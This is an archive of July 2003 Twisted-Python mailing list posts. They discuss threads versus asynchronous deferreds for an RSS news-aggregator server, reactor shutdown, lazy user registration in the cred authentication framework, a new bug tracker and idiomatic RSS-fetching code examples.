Date: Fri, 11 Jul 2003 14:04:36 +0200
Subject: [Twisted-Python] Simultaneously client-server app
References: <005401c34779$667b5700$0202d90a@its09455> <20030711075238.GB23649@frobozz>
Message-ID: <001d01c347a4$997360f0$3ba8a8c0@gatsoft.no>

I have some questions which seem to be related to this.

I have a webserver which serves as a newsaggregator etc. Once a while a
"worker" ( being a thread or not ) must go out and collect, parse and store
new items served by rss/rdf-feeds from around the net. Using a
SQLite-database which takes one connect at the time, at least as I
understand it, using threads could pose a serious problem if do-able at all.
I have another "worker" collecting information about files in given folders,
generating sha1-checksums etc. which is *very*  time consuming on large
amounts of data. This info must also go into the database.

So far I got the code that schedules a call and re-schedules it after the
call has finished. But the method that's called is blocking and has to be
re-written using deferreds or threads or something.

<dream-mode value="on" requirements="stupidity filter">
The utlimate goal would be to have some way of letting the user easily and
quickly define new workers doing user-defined things without hoggin the
server and by using as little as possible of strange, weird, technical,
complicated Twisted-things like deferreds, callbacks, threads etc.

My question is; is there a generic way to make old-style blocking Python
code twisted-friendly non-blocking using deferToThread or deferreds wrapped
around it?
</dream-mode>

I'm going to look into tnntprss.py which was mentioned yesterday or
something on the lists, which does some of the things I need, but any
example on how to go about this would be nice.

PS! Another question; should these workers be located in an
ApplicationService-subclass?

Thomas



----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 11, 2003 9:52 AM
Subject: Re: [Twisted-Python] Simultaneously client-server app


> On Fri, Jul 11, 2003 at 04:55:23PM +1000, Minh Luu wrote:
> >    Twisted Masters,
> >
> >    Has anyone any suggestion on how I might start on the following task
using
> >    Twisted?
> >
> >    What I would like to do is a type of server that will serve a number
of
> >    clients and itself is a client of other servers. It requires a spool
of
> >    worker threads to perform time-consuming tasks and database related
> >    tasks.  All the network I/O will be handled by a single async thread
using
> >    select. A simple diagram below demo the model I would like to
implement.
> [snip pretty diagram]
>
> I doubt threads and select are actually requirements you have, rather,
it's
> just how you think it should work.  But if you know how it should work,
why
> ask us?  ;)
>
> There are lots of blanks in your description, so it's hard to guess what
you
> need to know.  You effectively have asked a couple of very general
> questions, so I'll give some general answers, and hope that's enough.  If
it
> isn't, try being more specific about what you're doing, and I'll try to
give
> more specific answers.
>
>
> * Question: *
> "What I would like to do is a type of server that will serve a number of
> clients and itself is a client of other servers."
>
> * Answer: *
> Network clients and servers in Twisted are pretty easy, and its very good
> at them -- have you seen these HOWTOs?
>     http://twistedmatrix.com/documents/howto/servers
>     http://twistedmatrix.com/documents/howto/clients
>
> Being a server and a client at once is as easy as:
>     reactor.listenTCP(1234, MyServerFactory())
>     reactor.connectTCP('host', 4321, MyClientFactory())
>
>
> * Question: *
> "...a spool of worker threads to perform time-consuming tasks..."
>
> * Answer: *
> Have you seen the "Using Threads" HOWTO?
>     http://twistedmatrix.com/documents/howto/threading
>
> The key tool you probably want to use when working with threads is
> twisted.internet.threads.deferToThread.
>
> Also, be aware that threads aren't necessarily the only solution to
> "time-consuming tasks", although it would help to know what these tasks
> actually are :)
>
>
> * Question: *
> "...and database related tasks"
>
> * Answer: *
> The twisted.enterprise package has support for using standard Python
DB-API
> 2.0 compliant modules.  You probably just want to use
> twisted.enterprise.adbapi, which is described here:
>     http://twistedmatrix.com/documents/howto/enterprise
>
> That document is a little out of date, unfortunately -- it doesn't mention
> that you can avoid adbapi.Augmentation if you don't like that approach,
and
> just use adbapi.ConnectionPool directly, although the its API is fairly
ugly
> and not very Twisted-like.  That module could probably do with an
overhaul,
> but that's not your problem ;)
>
>
> I hope I've helped at least a little.
>
> Regards,
>
> -Andrew.
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From pje at telecommunity.com  Fri Jul 11 10:18:42 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Fri, 11 Jul 2003 12:18:42 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
Message-ID: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>

Hi.  I've recently had an inquiry from a PEAK user who wants their reactor 
loop to shut down automatically when there are no selectables or pending 
calls.  There doesn't appear to be any way to do this without breaking 
reactor encapsulation, as there is no (for example) 'getSelectables()' method.

Is this something that could be added, or is there any general interest in 
having idle reactors shut down?  In principle, there is no way for a 
running-on-empty reactor to do any further useful work, and no way for it 
to be shut down, either.  (If one is using threads, then there is always a 
"waker" selectable present, which means that by definition a reactor using 
threads is never "running on empty".)

Thanks.




From dalke at dalkescientific.com  Fri Jul 11 10:42:05 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Fri, 11 Jul 2003 10:42:05 -0600
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
Message-ID: <9B1926EE-B3BE-11D7-B4E7-000393C92466@dalkescientific.com>

Tony Meyer:
> This re really isn't that complex.

As someone who's had to do an inordinate amount of parsing in my
life, I agree with Tony.  The long regex he wrote is a good way
to do it.  It's concise, easy to understand (for anyone who has
done regexp work), less bug prone then breaking it out into
smaller regexps, etc.  And it's fast.

					Andrew
					dalke at dalkescientific.com




From itamar at itamarst.org  Fri Jul 11 11:57:03 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 11 Jul 2003 13:57:03 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
In-Reply-To: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
References: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
Message-ID: <20030711135703.73700ee0.itamar@itamarst.org>

On Fri, 11 Jul 2003 12:18:42 -0400
"Phillip J. Eby" <pje at telecommunity.com> wrote:

> Is this something that could be added, or is there any general
> interest in having idle reactors shut down?  In principle, there is no
> way for a running-on-empty reactor to do any further useful work, and
> no way for it to be shut down, either.  (If one is using threads, then
> there is always a "waker" selectable present, which means that by
> definition a reactor using threads is never "running on empty".)

There may be scheduled calls (and some of these are module level, e.g.
http and thus always present if that module is imported).

There may be a GUI connected to the event loop.

Users should probably track their, say, client connections if that's
what they're doing and shutdown the reactor manually.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From pje at telecommunity.com  Fri Jul 11 16:14:10 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Fri, 11 Jul 2003 18:14:10 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
In-Reply-To: <20030711135703.73700ee0.itamar@itamarst.org>
References: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
 <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
Message-ID: <5.1.1.6.0.20030711181150.031089d0@telecommunity.com>

At 01:57 PM 7/11/03 -0400, Itamar Shtull-Trauring wrote:
>On Fri, 11 Jul 2003 12:18:42 -0400
>"Phillip J. Eby" <pje at telecommunity.com> wrote:
>
> > Is this something that could be added, or is there any general
> > interest in having idle reactors shut down?  In principle, there is no
> > way for a running-on-empty reactor to do any further useful work, and
> > no way for it to be shut down, either.  (If one is using threads, then
> > there is always a "waker" selectable present, which means that by
> > definition a reactor using threads is never "running on empty".)
>
>There may be scheduled calls (and some of these are module level, e.g.
>http and thus always present if that module is imported).

There's a getDelayedCalls() method available to see what scheduled calls 
exist.  I was looking for an official way to check for selectables.




From 2002 at weholt.org  Fri Jul 11 18:05:16 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 02:05:16 +0200
Subject: [Twisted-Python] One big smile ...
Message-ID: <004d01c34809$46f32030$0401a8c0@razor>

I implemented a small newsfetching webserver today. At first I used some
blocking code at startup and then reactor.callLater(some_intervall,
sameBlockingMethod) to call it later and refresh the content later. It
processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
could see the output. I was quite happy about the result. Just for fun I
tried to do the blocking code in a thread instead, - with mixed results.
Read some more docs. And did a deferToThread for each call to the blocking
method. Added a callback-method that parsed the results. A bit more hacking
and ...then .. suddenly ... it was just .... so fast. No hogging the server
at startup, all content fetched,, *much* faster than before. Everything
seemed great. I had finally got the grip on threads and deferred. But
something was wrong with my data. Some data were in the wrong lists etc. so
I guess I need some mutex-locking or something. This is were you guys come
in. Do I need to aquire a lock to avoid updating wrong parts of my
datastructure?



In the docs it says:

"This will make certain parts of Twisted thread-safe so you can use them
safely. However, note that most parts of Twisted are not thread-safe."



What parts are still not thread-safe? My datastructures? They don't seem
thread-safe.

If I just solve the drunken attribute update process going on in my server
this will be a real break-thru for me Twisted-wise.

Anyway, I still have a HUGE smile on my face.



Thomas






From andrew-twisted at puzzling.org  Fri Jul 11 18:23:41 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sat, 12 Jul 2003 10:23:41 +1000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712002341.GB24694@frobozz>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
[...]
> seemed great. I had finally got the grip on threads and deferred. But
> something was wrong with my data. Some data were in the wrong lists etc. so
> I guess I need some mutex-locking or something. This is were you guys come
> in. Do I need to aquire a lock to avoid updating wrong parts of my
> datastructure?
> 
> In the docs it says:
> 
> "This will make certain parts of Twisted thread-safe so you can use them
> safely. However, note that most parts of Twisted are not thread-safe."
> 
> What parts are still not thread-safe? My datastructures? They don't seem
> thread-safe.

In general, unless something in Twisted says it is thread-safe, it's not
thread-safe.  So, unless you are very sure about what you're doing, make
sure your threads don't share data with any other threads, including the
main-loop.  If they must share data, then use reactor.callFromThread -- a
thread can safely use callFromThread to call a function in the main
event-loop thread.

> Anyway, I still have a HUGE smile on my face.

Woo!  :)

-Andrew.




From radix at twistedmatrix.com  Fri Jul 11 18:29:31 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 11 Jul 2003 20:29:31 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712002931.GA1208@radii>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> I implemented a small newsfetching webserver today. At first I used some
> blocking code at startup and then reactor.callLater(some_intervall,
> sameBlockingMethod) to call it later and refresh the content later. It
> processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
> could see the output. I was quite happy about the result. Just for fun I
> tried to do the blocking code in a thread instead, - with mixed results.
> Read some more docs. And did a deferToThread for each call to the blocking
> method. Added a callback-method that parsed the results. A bit more hacking
> and ...then .. suddenly ... it was just .... so fast. No hogging the server
> at startup, all content fetched,, *much* faster than before. Everything
> seemed great. I had finally got the grip on threads and deferred. But
> something was wrong with my data. Some data were in the wrong lists etc. so
> I guess I need some mutex-locking or something. This is were you guys come
> in. Do I need to aquire a lock to avoid updating wrong parts of my
> datastructure?

Why are you even using threads? What API are you using that is only
available as blocking calls?

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From exarkun at twistedmatrix.com  Fri Jul 11 18:37:54 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 20:37:54 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712003743.GA22695@intarweb.us>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> I implemented a small newsfetching webserver today. At first I used some
> blocking code at startup and then reactor.callLater(some_intervall,
> sameBlockingMethod) to call it later and refresh the content later. It
> processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
> could see the output.

  Why is your RSS/RDF parser blocking?

  Jp
-- 
A disciple of another sect once came to Drescher as he was eating his
morning meal. "I would like to give you this personality test," said the
outsider, "because I want you to be happy." Drescher took the paper that was
offered him and put it into the toaster: "I wish the toaster to be happy, 
too."
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030711/936321df/attachment.sig>

From 2002 at weholt.org  Fri Jul 11 18:56:20 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 02:56:20 +0200
Subject: [Twisted-Python] One big smile ...
References: <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
Message-ID: <005701c34810$68f725d0$0401a8c0@razor>

I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
each one to Mark Pilgrims Ultra Liberal Parser. The call to that
parse-method is actually what's being using in deferToThread. The I add a
callback-method which processes the result of the RSS/RDF-parsing. It's a
plain dictionary. This dictionary is processed into a simpler list. That's
it.

Alot of the things I'll be doing is like this; fetch a file from the net (
here the parser fetches it itself ), process the data returned from that
call and update some object or stuff the result into a database. The last
option most of the times probably, and the database will most likely be
SQLite which is not very thread-frinedly either. Other times it can be a
XML-RPC/SOAP-call which might take time to complete and the result of the
call might have to be processed. The last thing I can think of is scanning
folders and generating checksums. Probably the worst job of them all. Not
done often, but very time/resource-consuming when it occurs.

Most often I'll have to update something in the main thread, some state or
value, so if there's any way to use mutex/locks/whatever or ways to avoid
the whole thing I'm all ears ( one of the worlds most moronic statements
BTW ).

Thomas



----- Original Message -----
From: "Christopher Armstrong" <radix at twistedmatrix.com>
To: <twisted-python at twistedmatrix.com>
Sent: Saturday, July 12, 2003 2:29 AM
Subject: Re: [Twisted-Python] One big smile ...


> On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> > I implemented a small newsfetching webserver today. At first I used some
> > blocking code at startup and then reactor.callLater(some_intervall,
> > sameBlockingMethod) to call it later and refresh the content later. It
> > processed about 8-10 RSS/RDF feeds and then handed my server back to me
so I
> > could see the output. I was quite happy about the result. Just for fun I
> > tried to do the blocking code in a thread instead, - with mixed results.
> > Read some more docs. And did a deferToThread for each call to the
blocking
> > method. Added a callback-method that parsed the results. A bit more
hacking
> > and ...then .. suddenly ... it was just .... so fast. No hogging the
server
> > at startup, all content fetched,, *much* faster than before. Everything
> > seemed great. I had finally got the grip on threads and deferred. But
> > something was wrong with my data. Some data were in the wrong lists etc.
so
> > I guess I need some mutex-locking or something. This is were you guys
come
> > in. Do I need to aquire a lock to avoid updating wrong parts of my
> > datastructure?
>
> Why are you even using threads? What API are you using that is only
> available as blocking calls?
>
> --
>  Twisted | Christopher Armstrong: International Man of Twistery
>   Radix  |          Release Manager,  Twisted Project
> ---------+     http://twistedmatrix.com/users/radix.twistd/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From radix at twistedmatrix.com  Fri Jul 11 19:12:13 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 11 Jul 2003 21:12:13 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <005701c34810$68f725d0$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <20030712011213.GB1208@radii>

On Sat, Jul 12, 2003 at 02:56:20AM +0200, Thomas Weholt wrote:
> I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
> each one to Mark Pilgrims Ultra Liberal Parser. The call to that
> parse-method is actually what's being using in deferToThread. The I add a
> callback-method which processes the result of the RSS/RDF-parsing. It's a
> plain dictionary. This dictionary is processed into a simpler list. That's
> it.
> 
> Alot of the things I'll be doing is like this; fetch a file from the net (
> here the parser fetches it itself ), process the data returned from that
> call and update some object or stuff the result into a database. The last
> option most of the times probably, and the database will most likely be
> SQLite which is not very thread-frinedly either. Other times it can be a
> XML-RPC/SOAP-call which might take time to complete and the result of the
> call might have to be processed. The last thing I can think of is scanning
> folders and generating checksums. Probably the worst job of them all. Not
> done often, but very time/resource-consuming when it occurs.
> 
> Most often I'll have to update something in the main thread, some state or
> value, so if there's any way to use mutex/locks/whatever or ways to avoid
> the whole thing I'm all ears ( one of the worlds most moronic statements
> BTW ).

The way to avoid the problems is to _avoid threads whenever you
can_. For database access, Twisted already has an asynchronous
interface in twisted.enterprise. It uses threads, but in an isolated
way. Fetching files from the net and parsing data is possible to do
asynchronously already (see twisted.web.client). Twisted has an asynch
client interface to XMLRPC, and a SOAP one should be easy enough to
implement (see how the XMLRPC client interface was done). The
file-walking stuff could probably be done well just by breaking up the
process into steps, allowing the reactor to do the work it needs to do
in between steps (i.e., reactor.callLater(0, doSomeWork), and at the
end of doSomeWork, reschedule doSomeWork, until all work is done).

Does your RSS parser actually try to download data itself? If it does,
I would recommend trying to figure out how to get at the lower level
parsing bits; download the data with twisted.web.client, and then pass
the data to the parsing bits. All asynchronous, no threads (with their
data corruption and deadlocks) to worry about.


The big idea I'm trying to get through is that you should not be
defaulting to threads. Most of your use cases are possible to do
without them; the only time that threads are really required is when
you are trying to use a blocking interface that you don't want to or
can't plausibly rework.

Good luck,
-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dripton at ripton.net  Fri Jul 11 22:09:12 2003
From: dripton at ripton.net (David Ripton)
Date: Sat, 12 Jul 2003 00:09:12 -0400
Subject: [Twisted-Python] Lazily adding Identities in new cred
Message-ID: <3F0F89E8.3040001@ripton.net>

Hi,

I'm working on a turn-based game, with a server and N untrusted clients, 
using PB.

So far I just have a few hardcoded test users and passwords.  Now I'd 
like to add lazy user registration.  If a username is already known, 
then you need the password to log in.  If it's not known, you can claim 
that username by attempting to login, and your password should be 
immediately set to whatever you just used.

(I'm not saying this is the generally ideal way to add new users and 
assign their passwords, but it should definitely be doable in any 
reasonably flexible authentication framework.)

It appears that cred was not really designed to support this, because 
the password that the user entered is not passed to 
Authorizer.getIdentityRequest, which seems like the obvious place to 
lazily add an Identity.

Getting it there by patching Twisted would be easy enough: pass it from 
pb.authIdentity through AuthServ.remote_username into the call to 
getIdentityRequest.  The callers would always need to pass the password, 
but only a small percentage of Authorizers would actually use it, so 
this doesn't seem perfectly clean.  But I don't see a better alternative.

Suggestions?

-- 
David Ripton    dripton at ripton.net




From exarkun at twistedmatrix.com  Fri Jul 11 22:37:26 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sat, 12 Jul 2003 00:37:26 -0400
Subject: [Twisted-Python] Lazily adding Identities in new cred
In-Reply-To: <3F0F89E8.3040001@ripton.net>
References: <3F0F89E8.3040001@ripton.net>
Message-ID: <20030712043717.GA23859@intarweb.us>

On Sat, Jul 12, 2003 at 12:09:12AM -0400, David Ripton wrote:
> Hi,
> 
> I'm working on a turn-based game, with a server and N untrusted clients, 
> using PB.
> 
> So far I just have a few hardcoded test users and passwords.  Now I'd 
> like to add lazy user registration.  If a username is already known, 
> then you need the password to log in.  If it's not known, you can claim 
> that username by attempting to login, and your password should be 
> immediately set to whatever you just used.
> 
> (I'm not saying this is the generally ideal way to add new users and 
> assign their passwords, but it should definitely be doable in any 
> reasonably flexible authentication framework.)
> 
> It appears that cred was not really designed to support this, because 
> the password that the user entered is not passed to 
> Authorizer.getIdentityRequest, which seems like the obvious place to 
> lazily add an Identity.
> 
> Getting it there by patching Twisted would be easy enough: pass it from 
> pb.authIdentity through AuthServ.remote_username into the call to 
> getIdentityRequest.  The callers would always need to pass the password, 
> but only a small percentage of Authorizers would actually use it, so 
> this doesn't seem perfectly clean.  But I don't see a better alternative.
> 
> Suggestions?

  The best solution would seem to be to get PB working with the new cred
code -- which doesn't use Authorizers, Identities, or any of that confusion.

  Here's a simple credentials checker that adds all unrecognized usernames
that are requested (untested):

    from twisted import cred
    import twisted.cred.credentials
    import twisted.cred.checkers
    import twisted.cred.error

    from twisted.python.components import implements

    class LazyCredentialsChecker:
        __implements__ = (cred.checkers.ICredentialsChecker,)

        credentialInterfaces = (cred.credentials.IUsernamePassword,)

        def userExists(self, username):
            # Return true if username exists, false otherwise

        def getPassword(self, username):
            # Implement appropriately

        def addUser(self, username, password):
            # Here, too

        def requestAvatarId(self, creds):
            if implements(creds, cred.credentials.IUsernamePassword):
                if self.userExists(creds.username):
                    if self.getPassword(creds.username) == creds.password:
                        return creds.username
                    raise cred.error.UnauthorizedLogin()
                self.addUser(creds.username, creds.password)
                return creds.username
            raise NotImplementedError()

  An even nicer way to do this would be to create an interface for creating
a new user, (eg, IChargen), have requestAvatarId check for this interface,
and create the required entries in its database, rather than relying on the
non-existence of a username to create a new one (what if the user mistypes
their user?)

  Hope this helps,

  Jp

-- 
"The problem is, of course, that not only is economics bankrupt but it has
 always been nothing more than politics in disguise ... economics is a form
 of brain damage."  -- Hazel Henderson
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030712/5057f979/attachment.sig>

From 2002 at weholt.org  Sat Jul 12 04:39:50 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 12:39:50 +0200
Subject: [Twisted-Python] Storage for a NNTP-server?
Message-ID: <020001c34861$ec45c990$0401a8c0@razor>

Was wondering what I can use for storage for a NNTP-server? I'd like all of
my data to be kept in one place, data for a website, this news-server and
whatever else I might think of .... storing. Is that possible?

Would it be possible to require authentication for a few given groups, --
not all but some ?

I was wildly inspired by tnttprss.py I found on this list a few days back.
That was cool. But I don't want cog and/or pybsddb, because I allready got a
SQL-database running.

Best regards,
Thomas





From radix at twistedmatrix.com  Sat Jul 12 09:16:50 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 12 Jul 2003 11:16:50 -0400
Subject: [Twisted-Python] new bugtracker
Message-ID: <20030712151650.GA7767@radii>

I've finished setting up Roundup to replace our sourceforge based
bugtracker. I've migrated most of the open bugs that were on
sourceforge; so everyone go create a user and get crackin'.

http://twistedmatrix.com/users/roundup.twistd/twisted/

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Sat Jul 12 09:44:18 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 12 Jul 2003 17:44:18 +0200
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <20030712151650.GA7767@radii>
References: <20030712151650.GA7767@radii>
Message-ID: <1058024658.28521.0.camel@biproc>

On Sat, 2003-07-12 at 17:16, Christopher Armstrong wrote:
> I've finished setting up Roundup to replace our sourceforge based
> bugtracker. I've migrated most of the open bugs that were on
> sourceforge; so everyone go create a user and get crackin'.
> 
> http://twistedmatrix.com/users/roundup.twistd/twisted/

What will be the future of Issues ?




From radix at twistedmatrix.com  Sat Jul 12 09:54:07 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 12 Jul 2003 11:54:07 -0400
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <20030712151650.GA7767@radii>
References: <20030712151650.GA7767@radii>
Message-ID: <20030712155407.GB7767@radii>

On Sat, Jul 12, 2003 at 11:16:50AM -0400, Christopher Armstrong wrote:
> I've finished setting up Roundup to replace our sourceforge based
> bugtracker. I've migrated most of the open bugs that were on
> sourceforge; so everyone go create a user and get crackin'.
> 
> http://twistedmatrix.com/users/roundup.twistd/twisted/

btw, I just made a nicer URL for this.

http://twistedmatrix.com/bugs/

Brought to you by Moshe's wonderful RewriteResource.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From abe at fettig.net  Sat Jul 12 09:53:08 2003
From: abe at fettig.net (Abe Fettig)
Date: 12 Jul 2003 11:53:08 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <005701c34810$68f725d0$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii>  <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <1058025187.933.51.camel@mingus>

On Fri, 2003-07-11 at 20:56, Thomas Weholt wrote:
> I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
> each one to Mark Pilgrims Ultra Liberal Parser. The call to that
> parse-method is actually what's being using in deferToThread. The I add a
> callback-method which processes the result of the RSS/RDF-parsing. It's a
> plain dictionary. This dictionary is processed into a simpler list. That's
> it.
> 
> Alot of the things I'll be doing is like this; fetch a file from the net (
> here the parser fetches it itself ), process the data returned from that
> call and update some object or stuff the result into a database.

While Mark's feedparser does include it's own code for downloading the
feed over HTTP, it doesn't make sense to use it in a Twisted app.  You
should let Twisted download the rss file, thus avoiding the need to run
feedparser in a seperate thread.  It's easy enough to use the feedparser
parsing code on it's own once you've downloaded the file - that's what I
do in Hep.

I've attached two examples.  The first downloads my RSS feed using
Twisted, parses it with feedparser, and prints the results.  As you can
see, it's only a few lines of code.  The second example does the same
thing, but runs the parsing code in a seperate thread, so that you avoid
blocking even for the small amount of time feedparser takes to parse the
RSS (whether it actually makes sense to do this depends on the needs of
your application).

Abe
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rss_demo.py
Type: text/x-python
Size: 407 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030712/25e187c9/attachment-0004.py>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rss_demo2.py
Type: text/x-python
Size: 701 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030712/25e187c9/attachment-0005.py>

From m at moshez.org  Sat Jul 12 12:13:37 2003
From: m at moshez.org (Moshe Zadka)
Date: 12 Jul 2003 18:13:37 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058025187.933.51.camel@mingus>
References: <1058025187.933.51.camel@mingus>, <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii>  <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <20030712181337.16477.qmail@green.zadka.com>

On 12 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> I've attached two examples.  The first downloads my RSS feed using
> Twisted, parses it with feedparser, and prints the results.  As you can
> see, it's only a few lines of code.

Thanks a lot!
I would want, however, to comment on your examples and to show how
they could be a bit more "idiomatic".

from twisted.web.client import getPage
from feedparser import FeedParser
from twisted.internet import reactor, threads

def parsePage(data):
    parser = FeedParser()
    parser.feed(data)
    return parser

def formatParser(parser):
    return '\n'.join([parser.channel.get('title'), '']+
                     [i.get('title') for i in parser.items]+[''])

def getFormattedRSS(url):
    return getPage(url).addCallback(parsePage).addCallback(formatParser)

if __name__ == '__main__':
    import sys
    getFormattedRSS('http://www.fettig.net/?flav=rss'
    ).addCallback(sys.stdout.write
    ).addCallback(lambda _: reactor.stop()
    )
    reactor.run()

Note the "Golden rule": physically, the reactor.stop() and the reactor.run()
calls should be in physical proximity. This is a nice rule of thumb
for writing reusable code. Note, for example, how we can now use this
module (say, called formattedrss) to write resources:

import cgi
from twisted.web import resource, server
import formattedrss

class RSSFormatedResource(resource.Resource):

    def __init__(self, url):
        resource.Resource.__init__(self)
        self.url = url

    def render(self, request):
        getFormattedRSS(self.url).addCallback(request.write
        ).addCallback(lambda _: request.finish())
        return server.NOT_DONE_YET

or for implementing something useful for simple telnet clients:

from twisted.internet import protocol
from formattedrss import getFormattedRSS

class RSSFormattedProtocol(protocol.Protocol):

    def connectionMade(self):
        getFormattedRSS(self.factory.url).addCallback(self.transport.write
        ).addCallback(lambda _: self.transport.loseConnection())

class RSSFormattedFactory(protocol.Factory):
    protocol = RSSFormattedProtocol

    def __init__(self, url):
        self.url = url

if __name__ == '__main__':
    from twisted.internet import reactor
    reactor.listenTCP(1111,
                      RSSFormattedFactory('http://www.fettig.net/?flav=rss')

In general, this illustrates a not-completely-obvious technique: using
.addCallbacks to modify the return type of a deferred. This example
shows a common use for it: parsing raw data, and returning munged results.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From abe at fettig.net  Sat Jul 12 12:49:58 2003
From: abe at fettig.net (Abe Fettig)
Date: 12 Jul 2003 14:49:58 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712181337.16477.qmail@green.zadka.com>
References: <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <1058035798.1298.18.camel@mingus>

On Sat, 2003-07-12 at 14:13, Moshe Zadka wrote:
> Thanks a lot!
> I would want, however, to comment on your examples and to show how
> they could be a bit more "idiomatic".

Thanks, it's much appreciated.

> Note the "Golden rule": physically, the reactor.stop() and the reactor.run()
> calls should be in physical proximity. This is a nice rule of thumb
> for writing reusable code. Note, for example, how we can now use this
> module (say, called formattedrss) to write resources:

That makes a lot of sense.  Your examples were great - it's amazing how
easy it is to hook up a protocol to this kind of module. 

And, while you're in the mood for critiquing... 

Attached is a very small Twisted program I wrote last week as an
experiment with ApplicationServices.  It starts two simple services,
with a web interface that lets you start and stop them.  I was planning
to use this example as the basis for my first "What I've learned about
Twisted so far" article on my website, so suggestions/comments would be
great.

Abe
-------------- next part --------------
A non-text attachment was scrubbed...
Name: twisted-services-example.py
Type: text/x-python
Size: 1842 bytes
Desc: not available
